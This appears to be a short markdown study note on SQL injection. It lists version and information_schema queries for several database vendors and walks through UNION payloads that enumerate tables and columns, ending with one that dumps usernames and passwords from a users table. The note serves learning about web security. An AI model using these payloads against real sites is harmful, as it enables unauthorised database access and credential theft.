# Examin Database with SQL injection attacks

With SQL injection you can guess information about the database:

- The type and version of the database software.
- The tables and columns that the database contains.

### Table of content

- [Version](#version)
- [Content of the database]()

## Version

Database Type Query
--- | ---
Microsoft, MySQL | `SELECT @@version`
Oracle | `SELECT * FROM v$version`
PostgreSQL | `SELECT version()`

For example, you could use a UNION attack with the following input:

`' UNION SELECT @@version--`

## Content of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

:warning: database contents aren't call with the same Queries:

```sql
-- Oracle
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

-- Mircosof
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

-- PostgreSQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

-- MySQL
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

```sql
SELECT * FROM information_schema.tables
```

This returns output like the following:

```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

```sql
This returns output like the following:

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Exemple:

```sql
' UNION SELECT 'a', 'a' -- return -> 200 OK
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Found users_abcdef table interting:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```

Found column username_abcdef, password_abcdef

```sql
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

---

[**:arrow_right_hook: Back home**](/README.md)